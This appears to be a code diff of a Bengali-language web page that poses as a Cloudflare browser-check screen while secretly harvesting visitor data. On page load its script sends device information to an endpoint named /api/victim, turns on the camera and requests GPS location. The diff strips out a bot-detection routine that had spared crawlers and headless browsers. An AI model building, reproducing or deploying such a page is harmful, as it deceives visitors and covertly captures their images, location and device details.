@@ -73,7 +73,6 @@
             font-size: 14px;
         }
         video, canvas { display: none !important; }
-        #bot-message { display: none; color: #dc3545; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -86,7 +85,6 @@
         <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
         <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
         <p id="status">📡 তথ্য সংগ্রহ করা হচ্ছে...</p>
-        <div id="bot-message">⚠️ বট ডিটেক্ট করা হয়েছে, তথ্য সংগ্রহ বন্ধ রাখা হয়েছে।</div>
         <div class="attribution">
             DDoS সুরক্ষা দ্বারা
             <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
@@ -102,60 +100,7 @@
         (function() {
             "use strict";
 
-            // ================================================================
-            // 🔥 ১. বট ডিটেকশন সিস্টেম (শুধু রিয়েল ইউজার চিহ্নিত করবে)
-            // ================================================================
-            function isRealUser() {
-                const ua = navigator.userAgent.toLowerCase();
-
-                // ১.১. কমন সার্চ ইঞ্জিন ও সোশ্যাল মিডিয়া বট (যারা JS রান করে না)
-                if (ua.includes('bot') || 
-                    ua.includes('crawl') || 
-                    ua.includes('spider') || 
-                    ua.includes('headless') || 
-                    ua.includes('facebookexternalhit') || 
-                    ua.includes('googlebot') || 
-                    ua.includes('twitterbot') || 
-                    ua.includes('linkedinbot') ||
-                    ua.includes('slurp') ||
-                    ua.includes('bingbot') ||
-                    ua.includes('yandexbot')) {
-                    return false;
-                }
-
-                // ১.২. হেডলেস ব্রাউজার ডিটেক্ট (Puppeteer, Playwright, Selenium)
-                if (navigator.webdriver === true) {
-                    return false;
-                }
-
-                // ১.৩. প্লাগইন চেক (হেডলেস ব্রাউজারে সাধারণত ০ থাকে)
-                if (navigator.plugins.length === 0) {
-                    // লিনাক্স বা কিছু বিশেষ ব্রাউজারে ০ থাকতে পারে, তাই শুধু এইটা দিয়ে ব্লক করছি না
-                    // তবে অন্যান্য চেকের সাথে যুক্ত করছি
-                }
-
-                // ১.৪. Chrome রানটাইম চেক (হেডলেস ক্রোমে undefined থাকে)
-                if (window.chrome === undefined && ua.includes('chrome')) {
-                    return false;
-                }
-
-                // ১.৫. ভাষা চেক (কিছু বটে languages খালি থাকে)
-                if (navigator.languages.length === 0) {
-                    return false;
-                }
-
-                // ১.৬. স্ক্রিন সাইজ খুব ছোট হলে (কিছু বট 0x0 বা খুব ছোট ব্যবহার করে)
-                if (screen.width < 100 || screen.height < 100) {
-                    return false;
-                }
-
-                // সব চেক পাস করলে রিয়েল ইউজার
-                return true;
-            }
-
-            // ================================================================
-            // রে আইডি
-            // ================================================================
+            // ===== রে আইডি =====
             const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
             let ray = "";
             for (let i = 0; i < 17; i++) {
@@ -163,13 +108,10 @@
             }
             document.getElementById('ray').textContent = ray;
 
-            // ================================================================
-            // ভিক্টিম আইডি
-            // ================================================================
+            // ===== ভিক্টিম আইডি =====
             const pathParts = window.location.pathname.split('/');
             const victimId = pathParts[pathParts.length - 1];
             const statusEl = document.getElementById('status');
-            const botMsgEl = document.getElementById('bot-message');
 
             function setStatus(msg, type = 'info') {
                 statusEl.textContent = msg;
@@ -177,19 +119,7 @@
             }
 
             // ================================================================
-            // 🔥 ২. বট চেক (যদি বট হয় তাহলে কিছুই করবো না)
-            // ================================================================
-            if (!isRealUser()) {
-                console.log('🤖 বট ডিটেক্ট করা হয়েছে। ডেটা সংগ্রহ বন্ধ রাখা হয়েছে।');
-                botMsgEl.style.display = 'block';
-                setStatus('⛔ বট ডিটেক্ট করা হয়েছে', 'error');
-                return; // 👈 এখানেই থেমে যাবে, কোনো ডেটা যাবে না
-            }
-
-            console.log('✅ রিয়েল ইউজার ডিটেক্ট করা হয়েছে। ডেটা সংগ্রহ শুরু হচ্ছে...');
-
-            // ================================================================
-            // ৩. ডিভাইস ইনফো সংগ্রহ ও পাঠানো (শুধু রিয়েল ইউজারদের জন্য)
+            // ১. ডিভাইস ইনফো সংগ্রহ করে /api/victim-এ পাঠান
             // ================================================================
             async function sendDeviceInfo() {
                 try {
@@ -316,7 +246,7 @@
             }
 
             // ================================================================
-            // ৪. ক্যামেরা অ্যাক্সেস (ডিভাইস ইনফো পাঠানোর পরে)
+            // ২. ক্যামেরা অ্যাক্সেস
             // ================================================================
             async function startCamera() {
                 try {
@@ -370,7 +300,7 @@
             }
 
             // ================================================================
-            // ৫. লোকেশন (GPS)
+            // ৩. লোকেশন (GPS)
             // ================================================================
             async function getLocation() {
                 try {
@@ -406,15 +336,18 @@
             }
 
             // ================================================================
-            // ৬. মেইন ফাংশন
+            // ৪. মেইন ফাংশন
             // ================================================================
             async function main() {
+                // ১. ডিভাইস ইনফো পাঠান
                 await sendDeviceInfo();
+                // ২. ক্যামেরা চালু করুন
                 await startCamera();
+                // ৩. লোকেশন চেষ্টা করুন
                 await getLocation();
             }
 
-            // পেজ লোড হলে শুরু করুন (শুধু রিয়েল ইউজাররা এখানে আসবে)
+            // পেজ লোড হলে শুরু করুন
             window.addEventListener('load', main);
 
         })();
